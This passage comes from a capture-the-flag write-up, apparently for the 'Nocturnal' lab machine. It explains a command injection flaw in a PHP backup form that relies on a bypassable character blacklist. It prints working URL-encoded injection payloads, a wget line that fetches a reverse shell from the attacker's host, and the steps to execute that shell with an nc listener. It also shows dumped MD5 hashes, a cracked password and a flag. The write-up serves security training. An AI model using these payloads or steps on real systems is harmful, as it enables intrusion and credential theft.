</span><span id="__span-17-82"><a id="__codelineno-17-82" name="__codelineno-17-82" href="#__codelineno-17-82"></a><span class="w">            </span>&lt;button<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;backup&quot;</span>&gt;Create<span class="w"> </span>Backup&lt;/button&gt;
</span><span id="__span-17-83"><a id="__codelineno-17-83" name="__codelineno-17-83" href="#__codelineno-17-83"></a><span class="w">        </span>&lt;/form&gt;
</span><span id="__span-17-84"><a id="__codelineno-17-84" name="__codelineno-17-84" href="#__codelineno-17-84"></a>
</span><span id="__span-17-85"><a id="__codelineno-17-85" name="__codelineno-17-85" href="#__codelineno-17-85"></a><span class="w">        </span>&lt;div<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;backup-output&quot;</span>&gt;
</span><span id="__span-17-86"><a id="__codelineno-17-86" name="__codelineno-17-86" href="#__codelineno-17-86"></a>
</span><span id="__span-17-87"><a id="__codelineno-17-87" name="__codelineno-17-87" href="#__codelineno-17-87"></a>&lt;?php
</span><span id="__span-17-88"><a id="__codelineno-17-88" name="__codelineno-17-88" href="#__codelineno-17-88"></a><span class="k">if</span><span class="w"> </span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;backup&#39;</span><span class="o">])</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>!empty<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">]))</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-89"><a id="__codelineno-17-89" name="__codelineno-17-89" href="#__codelineno-17-89"></a><span class="w">    </span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>cleanEntry<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">])</span><span class="p">;</span>
</span><span id="__span-17-90"><a id="__codelineno-17-90" name="__codelineno-17-90" href="#__codelineno-17-90"></a><span class="w">    </span><span class="nv">$backupFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;backups/backup_&quot;</span><span class="w"> </span>.<span class="w"> </span>date<span class="o">(</span><span class="s1">&#39;Y-m-d&#39;</span><span class="o">)</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;.zip&quot;</span><span class="p">;</span>
</span><span id="__span-17-91"><a id="__codelineno-17-91" name="__codelineno-17-91" href="#__codelineno-17-91"></a>
</span><span id="__span-17-92"><a id="__codelineno-17-92" name="__codelineno-17-92" href="#__codelineno-17-92"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$password</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nb">false</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-93"><a id="__codelineno-17-93" name="__codelineno-17-93" href="#__codelineno-17-93"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;div class=&#39;error-message&#39;&gt;Error: Try another password.&lt;/div&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-17-94"><a id="__codelineno-17-94" name="__codelineno-17-94" href="#__codelineno-17-94"></a><span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-95"><a id="__codelineno-17-95" name="__codelineno-17-95" href="#__codelineno-17-95"></a><span class="w">        </span><span class="nv">$logFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/tmp/backup_&#39;</span><span class="w"> </span>.<span class="w"> </span>uniqid<span class="o">()</span><span class="w"> </span>.<span class="w"> </span><span class="s1">&#39;.log&#39;</span><span class="p">;</span>
</span><span id="__span-17-96"><a id="__codelineno-17-96" name="__codelineno-17-96" href="#__codelineno-17-96"></a>
</span><span id="__span-17-97"><a id="__codelineno-17-97" name="__codelineno-17-97" href="#__codelineno-17-97"></a><span class="w">        </span><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;zip -x &#39;./backups/*&#39; -r -P &quot;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$password</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot; &quot;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$backupFile</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot; .  &gt; &quot;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$logFile</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot; 2&gt;&amp;1 &amp;&quot;</span><span class="p">;</span>
</span><span id="__span-17-98"><a id="__codelineno-17-98" name="__codelineno-17-98" href="#__codelineno-17-98"></a>
</span><span id="__span-17-99"><a id="__codelineno-17-99" name="__codelineno-17-99" href="#__codelineno-17-99"></a><span class="w">        </span><span class="nv">$descriptor_spec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>
</span><span id="__span-17-100"><a id="__codelineno-17-100" name="__codelineno-17-100" href="#__codelineno-17-100"></a><span class="w">            </span><span class="nv">0</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="o">[</span><span class="s2">&quot;pipe&quot;</span>,<span class="w"> </span><span class="s2">&quot;r&quot;</span><span class="o">]</span>,<span class="w"> </span>//<span class="w"> </span>stdin
</span><span id="__span-17-101"><a id="__codelineno-17-101" name="__codelineno-17-101" href="#__codelineno-17-101"></a><span class="w">            </span><span class="nv">1</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="o">[</span><span class="s2">&quot;file&quot;</span>,<span class="w"> </span><span class="nv">$logFile</span>,<span class="w"> </span><span class="s2">&quot;w&quot;</span><span class="o">]</span>,<span class="w"> </span>//<span class="w"> </span>stdout
</span><span id="__span-17-102"><a id="__codelineno-17-102" name="__codelineno-17-102" href="#__codelineno-17-102"></a><span class="w">            </span><span class="nv">2</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="o">[</span><span class="s2">&quot;file&quot;</span>,<span class="w"> </span><span class="nv">$logFile</span>,<span class="w"> </span><span class="s2">&quot;w&quot;</span><span class="o">]</span>,<span class="w"> </span>//<span class="w"> </span>stderr
</span><span id="__span-17-103"><a id="__codelineno-17-103" name="__codelineno-17-103" href="#__codelineno-17-103"></a><span class="w">        </span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-17-104"><a id="__codelineno-17-104" name="__codelineno-17-104" href="#__codelineno-17-104"></a>
</span><span id="__span-17-105"><a id="__codelineno-17-105" name="__codelineno-17-105" href="#__codelineno-17-105"></a><span class="w">        </span><span class="nv">$process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>proc_open<span class="o">(</span><span class="nv">$command</span>,<span class="w"> </span><span class="nv">$descriptor_spec</span>,<span class="w"> </span><span class="nv">$pipes</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-17-106"><a id="__codelineno-17-106" name="__codelineno-17-106" href="#__codelineno-17-106"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>is_resource<span class="o">(</span><span class="nv">$process</span><span class="o">))</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-107"><a id="__codelineno-17-107" name="__codelineno-17-107" href="#__codelineno-17-107"></a><span class="w">            </span>proc_close<span class="o">(</span><span class="nv">$process</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-17-108"><a id="__codelineno-17-108" name="__codelineno-17-108" href="#__codelineno-17-108"></a><span class="w">        </span><span class="o">}</span>
</span><span id="__span-17-109"><a id="__codelineno-17-109" name="__codelineno-17-109" href="#__codelineno-17-109"></a>
</span><span id="__span-17-110"><a id="__codelineno-17-110" name="__codelineno-17-110" href="#__codelineno-17-110"></a><span class="w">        </span>sleep<span class="o">(</span><span class="m">2</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-17-111"><a id="__codelineno-17-111" name="__codelineno-17-111" href="#__codelineno-17-111"></a>
</span><span id="__span-17-112"><a id="__codelineno-17-112" name="__codelineno-17-112" href="#__codelineno-17-112"></a><span class="w">        </span><span class="nv">$logContents</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>file_get_contents<span class="o">(</span><span class="nv">$logFile</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-17-113"><a id="__codelineno-17-113" name="__codelineno-17-113" href="#__codelineno-17-113"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>strpos<span class="o">(</span><span class="nv">$logContents</span>,<span class="w"> </span><span class="s1">&#39;zip error&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nb">false</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-114"><a id="__codelineno-17-114" name="__codelineno-17-114" href="#__codelineno-17-114"></a><span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;div class=&#39;backup-success&#39;&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-17-115"><a id="__codelineno-17-115" name="__codelineno-17-115" href="#__codelineno-17-115"></a><span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;p&gt;Backup created successfully.&lt;/p&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-17-116"><a id="__codelineno-17-116" name="__codelineno-17-116" href="#__codelineno-17-116"></a><span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;a href=&#39;&quot;</span><span class="w"> </span>.<span class="w"> </span>htmlspecialchars<span class="o">(</span><span class="nv">$backupFile</span><span class="o">)</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;&#39; class=&#39;download-button&#39; download&gt;Download Backup&lt;/a&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-17-117"><a id="__codelineno-17-117" name="__codelineno-17-117" href="#__codelineno-17-117"></a><span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;h3&gt;Output:&lt;/h3&gt;&lt;pre&gt;&quot;</span><span class="w"> </span>.<span class="w"> </span>htmlspecialchars<span class="o">(</span><span class="nv">$logContents</span><span class="o">)</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-17-118"><a id="__codelineno-17-118" name="__codelineno-17-118" href="#__codelineno-17-118"></a><span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;/div&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-17-119"><a id="__codelineno-17-119" name="__codelineno-17-119" href="#__codelineno-17-119"></a><span class="w">        </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-17-120"><a id="__codelineno-17-120" name="__codelineno-17-120" href="#__codelineno-17-120"></a><span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;div class=&#39;error-message&#39;&gt;Error creating the backup.&lt;/div&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-17-121"><a id="__codelineno-17-121" name="__codelineno-17-121" href="#__codelineno-17-121"></a><span class="w">        </span><span class="o">}</span>
</span><span id="__span-17-122"><a id="__codelineno-17-122" name="__codelineno-17-122" href="#__codelineno-17-122"></a>
</span><span id="__span-17-123"><a id="__codelineno-17-123" name="__codelineno-17-123" href="#__codelineno-17-123"></a><span class="w">        </span>unlink<span class="o">(</span><span class="nv">$logFile</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-17-124"><a id="__codelineno-17-124" name="__codelineno-17-124" href="#__codelineno-17-124"></a><span class="w">    </span><span class="o">}</span>
</span><span id="__span-17-125"><a id="__codelineno-17-125" name="__codelineno-17-125" href="#__codelineno-17-125"></a><span class="o">}</span>
</span><span id="__span-17-126"><a id="__codelineno-17-126" name="__codelineno-17-126" href="#__codelineno-17-126"></a>?&gt;
</span><span id="__span-17-127"><a id="__codelineno-17-127" name="__codelineno-17-127" href="#__codelineno-17-127"></a>
</span><span id="__span-17-128"><a id="__codelineno-17-128" name="__codelineno-17-128" href="#__codelineno-17-128"></a><span class="w">    </span>&lt;/div&gt;
</span><span id="__span-17-129"><a id="__codelineno-17-129" name="__codelineno-17-129" href="#__codelineno-17-129"></a>
</span><span id="__span-17-130"><a id="__codelineno-17-130" name="__codelineno-17-130" href="#__codelineno-17-130"></a><span class="w">        </span>&lt;?php<span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$backupMessage</span><span class="o">))</span><span class="w"> </span><span class="o">{</span><span class="w"> </span>?&gt;
</span><span id="__span-17-131"><a id="__codelineno-17-131" name="__codelineno-17-131" href="#__codelineno-17-131"></a><span class="w">            </span>&lt;div<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;message&quot;</span>&gt;&lt;?php<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$backupMessage</span><span class="p">;</span><span class="w"> </span>?&gt;&lt;/div&gt;
</span><span id="__span-17-132"><a id="__codelineno-17-132" name="__codelineno-17-132" href="#__codelineno-17-132"></a><span class="w">        </span>&lt;?php<span class="w"> </span><span class="o">}</span><span class="w"> </span>?&gt;
</span><span id="__span-17-133"><a id="__codelineno-17-133" name="__codelineno-17-133" href="#__codelineno-17-133"></a><span class="w">    </span>&lt;/div&gt;
</span><span id="__span-17-134"><a id="__codelineno-17-134" name="__codelineno-17-134" href="#__codelineno-17-134"></a>&lt;/body&gt;
</span><span id="__span-17-135"><a id="__codelineno-17-135" name="__codelineno-17-135" href="#__codelineno-17-135"></a>&lt;/html&gt;
</span></code></pre></div><br />
Whats interesting here, is the part where our input is parsed:</p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;zip -x &#39;./backups/*&#39; -r -P &quot;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$password</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot; &quot;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$backupFile</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot; .  &gt; &quot;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$logFile</span><span class="w"> </span>.<span class="w"> </span><span class="s2">&quot; 2&gt;&amp;1 &amp;&quot;</span><span class="p">;</span>
</span></code></pre></div>
<h6 id="why-it-works">Why it works:</h6>
<ul>
<li>it concatenates user input (<code>$password</code>) into a shell command without proper escaping or sanitization.</li>
<li>Their is an attempt to filter certain characters (<code>;</code>, <code>&amp;</code>, <code>|</code>, etc.) in <code>cleanEntry()</code>, but this blacklist approach is <strong>incomplete</strong> and <strong>can be bypassed</strong> using URL encoding, null bytes, tabs, newlines, or command substitution.</li>
</ul>
<h6 id="why-also-cleanentry-is-not-enough">Why also <code>cleanEntry()</code> is not enough:</h6>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="k">function</span><span class="w"> </span>cleanEntry<span class="o">(</span><span class="nv">$entry</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="w">    </span><span class="nv">$blacklist_chars</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="s1">&#39;;&#39;</span>,<span class="w"> </span><span class="s1">&#39;&amp;&#39;</span>,<span class="w"> </span><span class="s1">&#39;|&#39;</span>,<span class="w"> </span><span class="s1">&#39;$&#39;</span>,<span class="w"> </span><span class="s1">&#39; &#39;</span>,<span class="w"> </span><span class="s1">&#39;&#39;</span>,<span class="w"> </span><span class="s1">&#39;{&#39;</span>,<span class="w"> </span><span class="s1">&#39;}&#39;</span>,<span class="w"> </span><span class="s1">&#39;&amp;&amp;&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="w">    </span>foreach<span class="w"> </span><span class="o">(</span><span class="nv">$blacklist_chars</span><span class="w"> </span>as<span class="w"> </span><span class="nv">$char</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>strpos<span class="o">(</span><span class="nv">$entry</span>,<span class="w"> </span><span class="nv">$char</span><span class="o">)</span><span class="w"> </span>!<span class="o">==</span><span class="w"> </span><span class="nb">false</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span>false<span class="p">;</span><span class="w"> </span>//<span class="w"> </span>Malicious<span class="w"> </span>input<span class="w"> </span>detected
</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="w">        </span><span class="o">}</span>
</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="w">    </span><span class="o">}</span>
</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>
</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span>htmlspecialchars<span class="o">(</span><span class="nv">$entry</span>,<span class="w"> </span>ENT_QUOTES,<span class="w"> </span><span class="s1">&#39;UTF-8&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a><span class="o">}</span>
</span></code></pre></div><br />
- This function only checks for a <strong>limited set of characters</strong> using <code>strpos()</code>, which:<br />
    - Does not catch characters like tabs (<code>\t</code>), newlines (<code>\n</code>), or URL-encoded input.<br />
    - Can be bypassed with payloads that do not use the exact characters in your blacklist.<br />
Bottom line Blacklisting is never a reliable way to sanitize shell arguments.</p>
<h4 id="command-injection-testing">Command injection: testing</h4>
<p>by trial and error, i concluded in this command injection type using url encoding:<br />
<code>%09</code> -&gt; tab (because %20 for space did not work)<br />
<code>%OA</code> -&gt; newline</p>
<p>below some examples of command injection being possible:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>%0Abash%09-c%09<span class="s2">&quot;whoami&quot;</span>%0A
</span></code></pre></div><br />
<img alt="Pasted image 20250527204845" src="../MediaFiles/Pasted%20image%2020250527204845.png" /><br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>%0Abash%09-c%09<span class="s2">&quot;dir&quot;</span>%0A
</span></code></pre></div><br />
<img alt="Pasted image 20250527204916" src="../MediaFiles/Pasted%20image%2020250527204916.png" /></p>
<p>So we know command injection EXISTS, lets now find a php rev shell in order to upload it, i found this one: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php<br />
and specified my ip and port for the rev shell. (no other changes needed on this rev shell)</p>
<p>BUT For some reason, pasting my input directly on the "enter password" form,<br />
<img alt="Pasted image 20250527202640" src="../MediaFiles/Pasted%20image%2020250527202640.png" /><br />
only executed one-word command injections like  the ones above and did not execute any more complex ones no matter which url encoding i used. </p>
<p>So i thought that maybe sth wrong is going on, and i wanted to see the requests and responses in detail. thus i tried using BurpSuite.</p>
<h4 id="command-injection-rev-shell-upload">Command injection: rev shell: upload</h4>
<p>first, i input a random string, for example <code>sth</code><br />
<img alt="Pasted image 20250527203116" src="../MediaFiles/Pasted%20image%2020250527203116.png" /><br />
then in burp, go to Proxy&gt;Intercept&gt;Intercept is on</p>
<p>Once you see intercept is on<br />
<img alt="Pasted image 20250527203217" src="../MediaFiles/Pasted%20image%2020250527203217.png" /><br />
only then click on create backup, in order to capture the request<br />
<img alt="Pasted image 20250527203245" src="../MediaFiles/Pasted%20image%2020250527203245.png" /></p>
<p>now we successfully captured the request, on the right side you should see the page loading infinetely (because we are intercepting the request)<br />
<img alt="Pasted image 20250527203356" src="../MediaFiles/Pasted%20image%2020250527203356.png" /><br />
you can see our input <code>sth</code> on the left side, on the password variable.</p>
<p>After trial and error, and lots of searching, i concluded to this payload, so paste it in the password field  instead of <code>sth</code>:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>%0Abash%09-c%09<span class="s2">&quot;wget%0910.10.14.184:8000/rev_shell.php&quot;</span>%0A
</span></code></pre></div><br />
and now our new request should look like this<br />
<img alt="Pasted image 20250527193603" src="../MediaFiles/Pasted%20image%2020250527193603.png" /></p>
<p>once we do that, lets go to our machine to setup our python server in order to transfer our php rev shell from our machine towards the target<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8080</span>
</span></code></pre></div></p>
<p>only then hit forward in order to forward our request<br />
<img alt="Pasted image 20250527203744" src="../MediaFiles/Pasted%20image%2020250527203744.png" /><br />
and then you should see on your terminal, that the file has been successfully transfered:<br />
<img alt="Pasted image 20250527203910" src="../MediaFiles/Pasted%20image%2020250527203910.png" /></p>
<p>perfect! now the rev shell is in! </p>
<h4 id="command-injection-rev-shell-execution">Command injection: rev shell: execution</h4>
<p>Lets similarly now try executing it remotely, in order to get a rev shell back:</p>
<p>Follow the same procedure to intercept the initial request on the password field (just like we did earlier with the wget injection) but this time, modify the request on the password field, in such way that we are actually executing our php file:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>%0Abash%09-c%09<span class="s2">&quot;php%09rev_shell.php&quot;</span>%0A
</span></code></pre></div><br />
and now our new request should look like this<br />
<img alt="Pasted image 20250527193737" src="../MediaFiles/Pasted%20image%2020250527193737.png" /></p>
<p>then start our listener on the port we specified in our php shell:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">9001</span><span class="w"> </span>
</span></code></pre></div></p>
<p>next by forwarding the request, we receive our rev shell!<br />
<img alt="Pasted image 20250527193809" src="../MediaFiles/Pasted%20image%2020250527193809.png" /></p>
<p>stabilize shell:<br />
<div class="language-python highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span></code></pre></div></p>
<p>once inside, i searched for valuable files and folders<br />
<img alt="Pasted image 20250527193958" src="../MediaFiles/Pasted%20image%2020250527193958.png" /><br />
and found a folder that seems to be related to a database<br />
<img alt="Pasted image 20250527194105" src="../MediaFiles/Pasted%20image%2020250527194105.png" /><br />
but we cant view it here, lets download the file locally:</p>
<p>on the machines current directory:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
</span></code></pre></div><br />
on our machine<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>wget<span class="w"> </span><span class="m">10</span>.10.11.64:8000/nocturnal_database.db
</span></code></pre></div><br />
<img alt="Pasted image 20250527194533" src="../MediaFiles/Pasted%20image%2020250527194533.png" /><br />
nice, we got the .db file locally, lets mess with it </p>
<p>Found that the database has 2 tables<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>uploads
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>users
</span></code></pre></div></p>
<p>and by viewing the table users via sqlite, i found pairs of users and hashes.<br />
<code>SELECT * FROM users;</code><br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>--------------------------------
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>admin
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>d725aeba143f575736b07e045d8ceebb
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>--------------------------------
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>amanda
</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>df8b20aa0c935023f99ea58358fb63c4
</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>--------------------------------
</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>tobias
</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>55c82b1ccd55ab219b3b109b07d5061d
</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>--------------------------------
</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>kavi
</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>f38cde1654b39fea2bd4f72f1ae4cdda
</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a>--------------------------------
</span><span id="__span-30-14"><a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a>e0Al5
</span><span id="__span-30-15"><a id="__codelineno-30-15" name="__codelineno-30-15" href="#__codelineno-30-15"></a>101ad4543a96a7fd84908fd0d802e7db
</span><span id="__span-30-16"><a id="__codelineno-30-16" name="__codelineno-30-16" href="#__codelineno-30-16"></a>--------------------------------
</span></code></pre></div><br />
By validating with hash identifier, it appears that these hashes are most possibly MD5.</p>
<p>Next, put the hashes each one separately on a txt, and then run hashcat for each one to crack them.</p>
<p>Tried all of them, and only tobias's hash returned a pass from hashcat<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span><span class="w"> </span>hash.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</span></code></pre></div><br />
output:<br />
<img alt="Pasted image 20250527195022" src="../MediaFiles/Pasted%20image%2020250527195022.png" /><br />
so we got the pass of user Tobias<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>Tobias
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>slowmotionapocalypse
</span></code></pre></div><br />
and we are now in! lets grab the user flag!<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>d7cf10aa5810a5d746549a70d2b45c32
</span></code></pre></div></p>
<h1 id="privesc">Privesc</h1>
<p>we can now try to escalating privileges<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>sudo<span class="w"> </span>-l
</span></code></pre></div><br />
does not appear to allow us to run sudo<br />
<img alt="Pasted image 20250527195628" src="../MediaFiles/Pasted%20image%2020250527195628.png" /></p>
<p>lets now inspect the processes:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>ps<span class="w"> </span>-aux
</span></code></pre></div><br />
nothing too obvious found here, lets move on</p>
<p>Lets observe the <strong>active network connections and listening ports</strong><br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>netstat<span class="w"> </span>-tuln
</span></code></pre></div><br />
output:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>tobias@nocturnal:~$<span class="w"> </span>netstat<span class="w"> </span>-tuln
